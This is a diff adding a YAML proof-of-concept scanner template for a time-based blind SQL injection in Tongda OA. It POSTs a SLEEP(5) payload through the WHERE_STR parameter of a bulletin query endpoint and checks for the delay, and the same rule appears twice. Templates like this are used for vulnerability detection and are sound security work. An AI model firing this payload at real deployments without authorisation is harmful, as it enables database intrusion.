@@ -1,0 +1,24 @@
+name: poc-yaml-通达OA-WHERE_STR-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      WHERE_STR=-@`'` AND (SELECT 4916 FROM (SELECT(SLEEP(5)))Xsep)
+    expression:
+      status: 200
+      sleep: 5
+  - method: POST
+    path: /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      WHERE_STR=-@`'` AND (SELECT 4916 FROM (SELECT(SLEEP(5)))Xsep)
+    expression:
+      status: 200
+      sleep: 5
